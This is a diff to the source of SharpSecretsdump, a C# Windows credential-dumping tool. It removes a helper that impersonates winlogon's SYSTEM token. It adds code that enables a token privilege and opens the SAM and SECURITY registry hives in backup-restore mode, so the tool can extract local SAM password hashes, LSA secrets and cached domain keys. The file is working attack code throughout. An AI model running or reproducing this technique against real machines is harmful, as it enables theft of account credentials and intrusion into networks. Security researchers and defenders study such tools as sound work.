@@ -13,59 +13,29 @@ namespace SharpSecretsdump
 {
     public static class Helpers
     {
-        public static bool GetSystem()
+        public const int SE_PRIVILEGE_ENABLED = 0x00000002;
+        public const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
+        public const int TOKEN_QUERY = 0x0008;
+        public const int KEY_READ = 0x20019;
+        public const int REG_OPTION_BACKUP_RESTORE = 0x4;
+
+        public static void EnablePrivilege(string privilegeName)
         {
-            // helper to elevate to SYSTEM via token impersonation
-            //  used for LSA secret (DPAPI_SYSTEM) retrieval
-            if (IsHighIntegrity())
+            if (!Interop.OpenProcessToken(Interop.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr tokenHandle))
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed.");
+
+            if (!Interop.LookupPrivilegeValue(null, privilegeName, out Interop.LUID luid))
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "LookupPrivilegeValue failed.");
+
+            Interop.TOKEN_PRIVILEGES tp = new Interop.TOKEN_PRIVILEGES
             {
-                IntPtr hToken = IntPtr.Zero;
+                PrivilegeCount = 1,
+                Luid = luid,
+                Attributes = SE_PRIVILEGE_ENABLED
+            };
 
-                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
-                Process[] processes = Process.GetProcessesByName("winlogon");
-                IntPtr handle = processes[0].Handle;
-
-                // TOKEN_DUPLICATE = 0x0002
-                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
-                if (!success)
-                {
-                    //Console.WriteLine("OpenProcessToken failed!");
-                    return false;
-                }
-
-                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
-                // 2 == SecurityImpersonation
-                IntPtr hDupToken = IntPtr.Zero;
-                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
-                if (!success)
-                {
-                    //Console.WriteLine("DuplicateToken failed!");
-                    return false;
-                }
-
-                success = Interop.ImpersonateLoggedOnUser(hDupToken);
-                if (!success)
-                {
-                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
-                    return false;
-                }
-
-                // clean up the handles we created
-                Interop.CloseHandle(hToken);
-                Interop.CloseHandle(hDupToken);
-
-                bool isSystem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
-                if (!isSystem)
-                {
-                    return false;
-                }
-
-                return true;
-            }
-            else
-            {
-                return false;
-            }
+            if (!Interop.AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "AdjustTokenPrivileges failed.");
         }
 
         public static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
@@ -154,7 +124,7 @@ namespace SharpSecretsdump
 
                 if (nlkmKey != null && nlkmKey.Length > 0)
                 {
-                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+                    result = Interop.RegCreateKeyEx(0x80000002, keyPath, 0, null, Helpers.REG_OPTION_BACKUP_RESTORE, Helpers.KEY_READ, IntPtr.Zero, ref hKey, ref dummy);
                     if (result != 0)
                     {
                         string errorMessage = new Win32Exception((int)result).Message;
@@ -212,7 +182,7 @@ namespace SharpSecretsdump
                     keyPath = "SECURITY\\Policy\\Secrets";
                     classVal = new StringBuilder(1024);
                     len = 1024;
-                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+                    result = Interop.RegCreateKeyEx(0x80000002, keyPath, 0, null, REG_OPTION_BACKUP_RESTORE, KEY_READ, IntPtr.Zero, ref hKey, ref dummy);
                     if (result != 0)
                     {
                         string errorMessage = new Win32Exception((int)result).Message;
@@ -378,7 +348,7 @@ namespace SharpSecretsdump
         public static void GetSamAccounts(byte[] bootkey)
         {
             Console.WriteLine("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
-            byte[] fVal = GetRegKeyValue("SAM\\Sam\\Domains\\Account", "F");
+            byte[] fVal = GetRegKeyValue("SAM\\SAM\\Domains\\Account", "F");
             byte[] hashedBootKey = GetHashedBootKey(bootkey, fVal);
             byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
             byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
@@ -388,7 +358,7 @@ namespace SharpSecretsdump
             String keyPath = "SAM\\Sam\\Domains\\Account\\Users";
             StringBuilder classVal = new StringBuilder(1024);
             int len = 1024;
-            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+            int result = Interop.RegCreateKeyEx(0x80000002, keyPath, 0, null, REG_OPTION_BACKUP_RESTORE, KEY_READ, IntPtr.Zero, ref hKey, ref dummy);
             if (result != 0)
             {
                 string errorMessage = new Win32Exception((int)result).Message;
@@ -516,12 +486,10 @@ namespace SharpSecretsdump
         public static byte[] GetRegKeyValue(string keyPath, string valueName = null, bool silent = false)
         {
             IntPtr hKey = IntPtr.Zero;
+            IntPtr dummy = IntPtr.Zero;
 
-            // takes a given HKLM key path and returns the registry value
-
-            // open the specified key with read (0x19) privileges
             //  0x80000002 == HKLM
-            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+            int result = Interop.RegCreateKeyEx(0x80000002, keyPath, 0, null, REG_OPTION_BACKUP_RESTORE, KEY_READ, IntPtr.Zero, ref hKey, ref dummy);
             if (result != 0)
             {
                 string errorMessage = new Win32Exception((int)result).Message;
@@ -576,7 +544,6 @@ namespace SharpSecretsdump
         public static bool IsHighIntegrity()
         {
             // returns true if the current process is running with adminstrative privs in a high integrity context
-
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
